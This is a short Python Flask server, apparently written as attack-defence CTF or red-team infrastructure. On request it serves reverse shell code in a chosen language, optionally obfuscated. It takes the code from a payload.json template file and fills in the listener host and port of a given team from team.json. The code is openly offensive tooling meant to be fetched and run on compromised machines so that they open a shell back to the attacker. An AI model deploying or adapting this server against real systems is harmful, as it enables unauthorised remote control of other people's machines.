import json
from flask import Flask, request, Response


app = Flask(__name__)

DEFAULT_LANGUAGE = 'bash'
DEFAULT_OBFUSCATE = False
DEFAULT_HOST = '127.0.0.1'
DEFAULT_PORT = '8787'

@app.route('/', methods=['GET'], defaults={'team_id': None, 'language': None, 'return_raw': None})
@app.route('/<team_id>', methods=['GET'], defaults={'language': None, 'return_raw': None})
@app.route('/<team_id>/<language>', methods=['GET'], defaults={'return_raw': None})
@app.route('/<team_id>/<language>/<return_raw>', methods=['GET'])
def get_reverse_shell_code(team_id, language, return_raw):
    with open('payload.json', 'r') as f:
        payload = json.loads(f.read())

    with open('team.json', 'r') as f:
        team = json.loads(f.read())

    if team_id and team_id in team:
        host = team[team_id]['host']
        port = team[team_id]['port']
    else:
        host = DEFAULT_HOST
        port = DEFAULT_PORT

    if not language or language not in payload:
        language = DEFAULT_LANGUAGE

    if return_raw:
        code = payload[language]['raw']
    else:
        code = payload[language]['obfuscate'] if DEFAULT_OBFUSCATE else payload[language]['raw']
    # I don't know how to replace HOST and PORT in obfuscated code QQ
    return Response(code.format(HOST=host, PORT=port), mimetype='text/plain')

if __name__ == '__main__':
    # TODO: setup with argv
    app.run(host='0.0.0.0')
